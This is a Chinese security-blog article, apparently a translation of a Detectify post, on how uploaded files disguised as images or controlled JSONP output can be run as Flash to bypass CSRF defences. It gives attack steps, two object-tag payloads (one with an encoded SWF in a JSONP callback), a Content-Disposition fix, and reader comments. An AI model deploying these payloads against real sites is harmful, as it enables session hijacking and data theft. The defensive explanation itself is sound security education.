<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">上传文件的陷阱</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">/fd</a> <span class="bull">·</span> <time title="2014/05/22 12:02" ui-time="" datetime="2014/05/22 12:02" class="published ng-binding ng-isolate-scope">2014/05/22 12:02</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 背景</h2><hr><p>现在很多网站都允许用户上传文件，但他们都没意识到让用户（或攻击者）上传文件（甚至合法文件）的陷阱。</p><p>什么是合法文件？</p><p>通常，判断文件是否合法会透过两个参数：文件后缀（File extension）及Content-Type。</p><p>例如，网站会确保后缀是jpg及Content-Type是image/jpeg以防止恶意文件，对不？</p><p>但一些像Flash的插件程序并不关心后缀及Content-type。假如一个文件被标签嵌入，它会像Flash一样执行，只要它的内容像个Flash文件。</p><p>但等等，Flash不是应该只在同域下被嵌入才会执行？亦对亦错。假如一个Flash文件（或以图像包装的Flash文件）在victim.com上传然后于attacker.com下嵌入，它只能在attacker.com下执行JavaScript。但是，假如该Flash文件发出请求，那么它可以读取到victim.com下的文件。</p><p>这说明了若不检查文件内容而直接上传，攻击者可以绕过网站的CSRF防御。</p><h2>0x01 攻击</h2><hr><p>基于上面我们可以想像一种攻击场境：</p><pre><code>1. 攻击者建立一个恶意Flash(SWF)文件  
2. 攻击者更改文件副档名为JPG  
3. 攻击者上传档案到victim.com  
4. 攻击者在attacker.com以标签及application/x-shockwave-flash类型嵌入该文件  
5. 受害者浏览attacker.com，并以SWF格式载入该文件  
6. 攻击者现在可以透过该SWF并以受害者的session向victim.com发出及接收任意请求  
7. 攻击者向victim.com发出请求后取得受害者的CSRF token  
</code></pre><p>payload会像这样</p><pre><code>&lt;object style="height:1px;width:1px;" data="http://victim.com/user/2292/profilepicture.jpg" type="application/x-shockwave-flash" allowscriptaccess="always" flashvars="c=read&amp;u=http://victim.com/secret_file.txt"&gt;&lt;/object&gt;   
</code></pre><h2>0x02 修补</h2><hr><p>好消息是有一个相对简单的方法防止该Flash的行为。 Flash若看到文件返回下面的Content-Disposition header就不会执行：</p><pre><code>Content-Disposition: attachment; filename="image.jpg"  
</code></pre><p>所以若允许上传或输出任意数据，网站应该总是检查内容是否合法而且尽可能返回<code>Content-Disposition header</code>。</p><h2>0x03 其他用途</h2><hr><p>实际上，该攻击不只限制于文件上传。该攻击只要求攻击者能够控制域名下的数据（不论Content-Type），因此还有其他实施攻击的方法。</p><p>其中一种是利用JSONP接口。通常，攻击者可以透过更改callback参数控制JSONP接口的输出。然而，攻击者可以把整个Flash文件的内容作为callback参数，而达到与上载文件无异的攻击。 Payload会像这样：</p><pre><code>&lt;object style="height:1px;width:1px;" data="http://victim.com/user/jsonp?callback=CWS%07%0E000x%9C%3D%8D1N%C3%40%10E%DF%AE%8D%BDI%08%29%D3%40%1D%A0%A2%05%09%11%89HiP%22%05D%8BF%8E%0BG%26%1B%D9%8E%117%A0%A2%DC%82%8A%1Br%04X%3B%21S%8C%FE%CC%9B%F9%FF%AA%CB7Jq%AF%7F%ED%F2%2E%F8%01%3E%9E%18p%C9c%9Al%8B%ACzG%F2%DC%BEM%EC%ABdkj%1E%AC%2C%9F%A5%28%B1%EB%89T%C2Jj%29%93%22%DBT7%24%9C%8FH%CBD6%29%A3%0Bx%29%AC%AD%D8%92%FB%1F%5C%07C%AC%7C%80Q%A7Nc%F4b%E8%FA%98%20b%5F%26%1C%9F5%20h%F1%D1g%0F%14%C1%0A%5Ds%8D%8B0Q%A8L%3C%9B6%D4L%BD%5F%A8w%7E%9D%5B%17%F3%2F%5B%DCm%7B%EF%CB%EF%E6%8D%3An%2D%FB%B3%C3%DD%2E%E3d1d%EC%C7%3F6%CD0%09" type="application/x-shockwave-flash" allowscriptaccess="always" flashvars="c=alert&amp;u=http://victim.com/secret_file.txt"&gt;&lt;/object&gt;
</code></pre><p>from: http://blog.detectify.com/post/86298380233/the-pitfalls-of-allowing-file-uploads-on-your-website</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/2554" rel="bookmark" id="re1">上传文件的陷阱II 纯数字字母的swf是漏洞么?</a></li><li><a href="http://drops.wooyun.org/tips/153" rel="bookmark" id="re2">Flash安全的一些总结</a></li><li><a href="http://drops.wooyun.org/tips/2924" rel="bookmark" id="re3">常见Flash XSS攻击方式</a></li><li><a href="http://drops.wooyun.org/tips/150" rel="bookmark" id="re4">Browser Security-css、javascript</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">wuqi</span> <span class="reply-time">2014-08-26 16:42:34</span></div><p></p><p>Discuz 的crossdomain.xml本身就是個坑</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">iv4n</span> <span class="reply-time">2014-07-14 13:57:01</span></div><p></p><p>POC文章中已经给出来了。JSONP XSS的poc换成object就行了，就算修补方案是content-type也无用。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">魔术师</span> <span class="reply-time">2014-05-23 09:37:18</span></div><p></p><p>JSONP这种利用方式有谁测试了吗，不知能否提供个poc</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">/fd</span> <span class="reply-time">2014-05-22 19:53:19</span></div><p></p><p>Discuz 的crossdomain.xml本身就是個坑</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">D＆G</span> <span class="reply-time">2014-05-22 19:02:12</span></div><p></p><p>discuz实例在哪里呀~~今天刚看到还没看明白，就有中文版了。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xfkxfk</span> <span class="reply-time">2014-05-22 18:41:53</span></div><p></p><p>一楼的M牛不是发过Discuz的实例么</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2014-05-22 15:29:21</span></div><p></p><p>callback 经过某人常年的扫荡下，已经过滤掉了之类字符</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2014-05-22 14:31:41</span></div><p></p><p>you got it~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Sogili</span> <span class="reply-time">2014-05-22 14:07:35</span></div><p></p><p>JSON 才是亮点.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">/fd</span> <span class="reply-time">2014-05-22 12:34:22</span></div><p></p><p>在zone发表不了新话题　就來水一篇了　哈哈</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mramydnei</span> <span class="reply-time">2014-05-22 12:29:30</span></div><p></p><p>还没玩爽呢 你就翻译发出来了TAT</p><p></p></div></div></div></div></div></main>